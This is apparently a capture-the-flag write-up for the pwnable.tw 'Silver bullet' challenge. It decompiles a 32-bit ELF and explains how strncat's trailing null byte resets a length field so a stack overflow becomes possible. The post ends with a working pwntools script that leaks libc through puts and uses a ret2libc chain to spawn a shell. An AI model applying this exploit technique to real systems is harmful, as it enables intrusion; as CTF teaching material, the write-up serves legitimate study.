---
date: '2025-08-29T12:44:32+07:00'
draft: false
title: 'Silver bullet (200 pts) - pwnable.tw'
tags: ["pwnable.tw"]
---

## 0x1. Initial Reconnaissance 

### file

```
↪ file silver_bullet 
silver_bullet: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=8c95d92edf8bf47b6c9c450e882b7142bf656a92, not stripped
```

### checksec
```
↪ checksec --file=silver_bullet
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH	Symbols		FORTIFY	Fortified	Fortifiable	FILE
Full RELRO      No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   85 Symbols	  No	0		4		silver_bullet
```

### ./silver_bullet
```
↪ ./silver_bullet
+++++++++++++++++++++++++++
       Silver Bullet       
+++++++++++++++++++++++++++
 1. Create a Silver Bullet 
 2. Power up Silver Bullet 
 3. Beat the Werewolf      
 4. Return                 
+++++++++++++++++++++++++++
Your choice :
```

## 0x2. Reverse Engineering

### main
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int v5[2]; // [esp+0h] [ebp-3Ch] BYREF
  char v6[48]; // [esp+8h] [ebp-34h] BYREF
  int v7; // [esp+38h] [ebp-4h]

  init_proc();
  v7 = 0;
  memset(v6, 0, sizeof(v6));
  v5[0] = 0x7FFFFFFF;
  v5[1] = (int)"Gin";
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          menu();
          v3 = read_int();
          if ( v3 != 2 )
            break;
          power_up((int)v6);
        }
        if ( v3 > 2 )
          break;
        if ( v3 != 1 )
          goto LABEL_15;
        create_bullet((int)v6);
      }
      if ( v3 == 3 )
        break;
      if ( v3 == 4 )
      {
        puts("Don't give up !");
        exit(0);
      }
LABEL_15:
      puts("Invalid choice");
    }
    if ( beat((int)v6, (int)v5) )
      return 0;
    puts("Give me more power !!");
  }
}
```

### create_bullet
```c
int __cdecl create_bullet(int a1)
{
  int v2; // [esp+0h] [ebp-4h]

  if ( *(_BYTE *)a1 )
    return puts("You have been created the Bullet !");
  printf("Give me your description of bullet :");
  read_input(a1, 48);
  v2 = strlen(a1);
  printf("Your power is : %u\n", v2);
  *(_DWORD *)(a1 + 48) = v2;
  return puts("Good luck !!");
}
```

### power_up
```c
int __cdecl power_up(int a1)
{
  char v2[48]; // [esp+0h] [ebp-34h] BYREF
  int v3; // [esp+30h] [ebp-4h]

  v3 = 0;
  memset(v2, 0, sizeof(v2));
  if ( !*(_BYTE *)a1 )
    return puts("You need create the bullet first !");
  if ( *(_DWORD *)(a1 + 48) > 0x2Fu )
    return puts("You can't power up any more !");
  printf("Give me your another description of bullet :");
  read_input((int)v2, 48 - *(_DWORD *)(a1 + 48));
  strncat(a1, (int)v2, 48 - *(_DWORD *)(a1 + 48));
  v3 = strlen((int)v2) + *(_DWORD *)(a1 + 48);
  printf("Your new power is : %u\n", v3);
  *(_DWORD *)(a1 + 48) = v3;
  return puts("Enjoy it !");
}
```

### beat 
```c
int __cdecl beat(int a1, int a2)
{
  if ( *(_BYTE *)a1 )
  {
    puts(">----------- Werewolf -----------<");
    printf(" + NAME : %s\n", *(const char **)(a2 + 4));
    printf(" + HP : %d\n", *(_DWORD *)a2);
    puts(">--------------------------------<");
    puts("Try to beat it .....");
    usleep(1000000);
    *(_DWORD *)a2 -= *(_DWORD *)(a1 + 48);
    if ( *(int *)a2 <= 0 )
    {
      puts("Oh ! You win !!");
      return 1;
    }
    else
    {
      puts("Sorry ... It still alive !!");
      return 0;
    }
  }
  else
  {
    puts("You need create the bullet first !");
    return 0;
  }
}
```

## 0x3. Analysis
In this challenge, they give you 4 options, creating a bullet allows you to input a string (maximum size is 48 bytes) and save the number of characters to v7 (in main function), which is v6 + 48. With power_up function, we can append a new string to v6 if the current size of v6 isn't 48. Then, the beat function just check whether v7 is greater than 0x7fffffff or not ? 


## 0x4. Exploit

When I researched on the Internet, I saw this:

```
char * strncat ( char * destination, const char * source, size_t num );

Append characters from string
Appends the first num characters of source to destination, plus a terminating null-character.
```

Damn, after append a new string to v6, <b>strncat()</b> add a null-character (\x00) right after. Because v7 is an int variable, that means the size of v6 would be stored at the byte right after v6. As a result, If you create a bullet of any size (as long as the size < 48) and use power_up function to fullfill the char array, you can overwrite 0 to the size of v6. This could help you continue to append a new string after v6 with the size of 48, leading to return address overwriten !!!

Because the first byte right after v6 stores the size (it's 1 now), you just need to overwrite /xff/xff/xff to the rest bytes of v7 and your current power is 0xffffff01, enough to kick the monster's ass.

With the return address, just overwrite like this:

```
return address -> puts_plt address
+0x4           -> The address of "pop ebx; ret;" (use ropgadget to get)
+0x8           -> The address of stdin in data section
+0xc           -> Tha address of main function
```

This enables you to call puts function. Putting the address of "pop ebx; ret;" right after as return address helps you pass argument and call one more conventions also. And now, you can get the address of _IO_2_1_stdin_ in libc, calculate the libc base, then run the main function again.

Now, you get the lib base, you can get every address you want. Just do everything above again, but now overwrite like this:

```
return adderss -> system address that you calculated
+0x4           -> whatever you want as return adderss for the function above
+0x8           -> The address of /bin/sh you found in libc
```

And now, you can get shell.

###### Exploit:
``` py
from pwn import *
import time

exe = ELF("./silver_bullet_patched")
libc = ELF("./libc_32.so.6")
ld = ELF("./ld-2.23.so")

context.binary = exe
context.log_level = "debug"

def conn():
    if args.LOCAL:
        r = process([exe.path])
        # r = gdb.debug ([exe.path], "b *main")
    else:
        r = remote("chall.pwnable.tw", 10103)

    return r

def create_bullet (p, description):
    p.sendlineafter (b'Your choice :', b'1')
    p.sendafter (b'Give me your description of bullet :', description)


def powerup (p, description):
    p.sendlineafter (b'Your choice :', b'2')
    p.sendafter (b'Give me your another description of bullet :', description)

def beat (p):
    p.sendlineafter (b'Your choice :', b'3')

def main():
    p = conn()
    
    one_pop = 0x08048475
    stdin = 0x804b020
    main_func = 0x8048954

    create_bullet (p, b'A' * 47)
    powerup (p, b'A')
    powerup (p, b'\xff' * 3 + b'A' * 4 + p32(exe.plt['puts']) + p32(one_pop) + p32 (stdin) + p32(main_func))
    beat(p)
    
    p.recvuntil (b'Oh ! You win !!\n')
    temp = p.recvn(4)
    temp = u32(temp)

    libc_base = temp - libc.symbols['_IO_2_1_stdin_']
    system_func = libc_base + libc.symbols['system']
    bin_sh = libc_base + next (libc.search (b'/bin/sh'))
    print ("The address of stdin in libc is : ", hex (temp))
    print ("The address of libc is : ", hex (libc_base))
    print ("The address of function in libc is : ", hex (system_func))
    print ("The address stores /bin/sh in libc is :", hex (bin_sh))

    create_bullet (p, b'A' * 47)
    powerup (p, b'A')
    powerup (p, b'\xff' * 3 + b'A' * 4 + p32(system_func) + p32(one_pop) + p32(bin_sh))
    beat(p)

    p.interactive()


if __name__ == "__main__":
    main()
```
